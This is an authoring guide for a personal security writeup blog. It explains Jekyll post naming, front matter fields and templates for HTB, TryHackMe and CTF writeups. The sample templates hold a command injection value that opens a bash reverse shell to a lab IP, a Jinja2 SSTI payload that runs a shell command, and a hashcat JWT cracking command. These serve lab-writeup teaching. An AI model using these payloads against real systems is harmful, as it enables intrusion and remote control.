# Content Authoring & Publishing Guide

Comprehensive guide for creating, formatting, and publishing new writeups, research papers, and technical articles on `cerberusmrxi.github.io`.

---

## 1. File Location & Naming Convention

All new blog posts and writeups must be placed inside the `_posts/` folder using the standard Jekyll filename structure:

```text
_posts/YYYY-MM-DD-title-slug.md
```

### Examples:
- **CTF**: `_posts/2026-09-03-picoctf-web-challenge.md`
- **Hack The Box**: `_posts/2026-09-03-htb-sau-machine-writeup.md`
- **TryHackMe**: `_posts/2026-09-03-thm-rootme-walkthrough.md`
- **Research**: `_posts/2026-09-03-understanding-oauth2-vulnerabilities.md`

---

## 2. Front Matter Reference (Metadata Header)

Every post must begin with a YAML Front Matter block enclosed between `---` markers.

```yaml
---
layout: post
title: "HTB: Example Machine Walkthrough"
date: 2026-09-03
categories: [HTB, Web]
tags: [Linux, Nmap, RCE, PrivEsc]
platform: HTB
difficulty: Medium
os: Linux
image: "/assets/images/htb/cover.png"
description: "Detailed walkthrough covering port scanning, web application exploitation, and root privilege escalation."
---
```

### Metadata Fields Breakdown

| Field | Required | Allowed / Recommended Values | Description |
| :--- | :---: | :--- | :--- |
| `layout` | **Yes** | `post` | Tells Jekyll to use the blog post layout template. |
| `title` | **Yes** | String (e.g. `"HTB: Machine Writeup"`) | Display title of the writeup. |
| `date` | **Yes** | `YYYY-MM-DD` | Date of publication. |
| `categories` | **Yes** | `[HTB, Web]`, `[TryHackMe, Network]`, `[CTF, Crypto]`, `[Research, Vulnerability]`, `[Articles, Automation]` | Categories for filtering. |
| `platform` | **Yes** | `HTB`, `TryHackMe`, `CTF`, `Research`, `Articles` | Controls which tab page the writeup appears on. |
| `tags` | Optional | Array of tags, e.g. `[Python, SSTI, Web]` | Topic tags for search and badges. |
| `difficulty` | Optional | `Easy`, `Medium`, `Hard`, `Insane` | Color-coded difficulty badge. |
| `os` | Optional | `Linux`, `Windows`, `Android` | Target operating system. |
| `image` | Optional | `/assets/images/path/image.png` | Cover image URL for card header / social preview. |
| `description` | Optional | String | Brief summary shown on card previews and SEO metas. |

---

## 3. Templates for Each Category

### Template A: Hack The Box (HTB) Writeup

```markdown
---
layout: post
title: "HTB: TargetMachine Writeup"
date: 2026-09-03
categories: [HTB, Web]
tags: [Linux, Nmap, RCE, PrivEsc]
platform: HTB
difficulty: Medium
os: Linux
description: "Walkthrough of HTB TargetMachine covering initial web RCE and SUID binary privilege escalation."
---

> [!NOTE]
> Public writeups adhere to HTB disclosure guidelines for retired machines.

## Executive Summary

The target system is a Medium-difficulty Linux host. Initial enumeration revealed an unauthenticated web command injection vulnerability leading to initial shell access (`www-data`). Local privilege escalation was achieved via path hijacking an improperly configured custom SUID binary.

---

## 01 — Reconnaissance & Enumeration

Initial Nmap port scan:

```bash
$ nmap -sC -sV -oA nmap/initial 10.10.11.200
```

---

## 02 — Initial Access (Web Exploitation)

Explain exploitation steps and provide proof-of-concept scripts:

```python
import requests

url = "http://10.10.11.200/api/export.php"
payload = "; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
r = requests.post(url, data={"filename": f"export.pdf{payload}"})
```

---

## 03 — Privilege Escalation

Detail root escalation steps and flag collection.
```

---

### Template B: TryHackMe Room Walkthrough

```markdown
---
layout: post
title: "TryHackMe: RoomName Walkthrough"
date: 2026-09-03
categories: [TryHackMe, Web]
tags: [JWT, Web, Authorization]
platform: TryHackMe
difficulty: Easy
os: Linux
description: "Step-by-step walkthrough covering JWT secret cracking and administrative privilege takeover."
---

## Overview

In this room, we examine common JSON Web Token (JWT) vulnerabilities, including JWT secret cracking using hashcat and algorithm confusion attacks (`alg: none`).

---

## Task 1 — Reconnaissance

Capturing valid session token:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## Task 2 — Cracking JWT Secret

```bash
$ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Secret identified: `secret123`
```

---

### Template C: CTF Challenge Writeup

```markdown
---
layout: post
title: "CTF Writeup: Challenge Title"
date: 2026-09-03
categories: [CTF, Web]
tags: [SSTI, Jinja2, Python]
platform: CTF
difficulty: Medium
description: "Detailed solution for a web challenge involving Server-Side Template Injection (SSTI) in Jinja2."
---

{% raw %}
## Challenge Summary

- **Category**: Web
- **Difficulty**: Medium
- **Event**: PicoCTF 2026

---

## 01 — Reconnaissance

Initial payload check: `GET /greeting?name={{7*7}}`

Result: `49` (Confirming Jinja2 SSTI)

---

## 02 — Exploitation

```python
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /flag.txt', shell=True, stdout=-1).communicate()[0].strip() }}
```
{% endraw %}
```

> **Note**: If your post contains Liquid template syntax like `{{ ... }}` or `{% ... %}`, wrap the section with `{% raw %}` and `{% endraw %}` tags so Jekyll does not parse it as Liquid code!

---

## 4. Adding Images & Screenshots

1. Save your screenshot in `assets/images/`:
   - E.g., `assets/images/htb/nmap-results.png`

2. Insert into Markdown:
   ```markdown
   ![Nmap Scan Output](/assets/images/htb/nmap-results.png)
   ```

All post images are automatically styled with rounded corners, dark borders, and responsive scaling (`max-width: 100%`).

---

## 5. Callout Alert Boxes

You can add formatted callout alert boxes using GitHub alert syntax:

```markdown
> [!NOTE]
> General note or background information.

> [!IMPORTANT]
> Responsible disclosure statement or crucial prerequisite.

> [!WARNING]
> Potential hazard, breaking change, or command caution.

> [!TIP]
> Optimization tip or trick for solving challenges faster.
```

---

## 6. Publishing Live to GitHub Pages

Once your post file is saved in `_posts/`, deploy it live with Git:

```bash
git add .
git commit -m "Add new CTF writeup"
git push origin main
```

Your post will be live at `https://cerberusmrxi.github.io/` within 1-2 minutes!
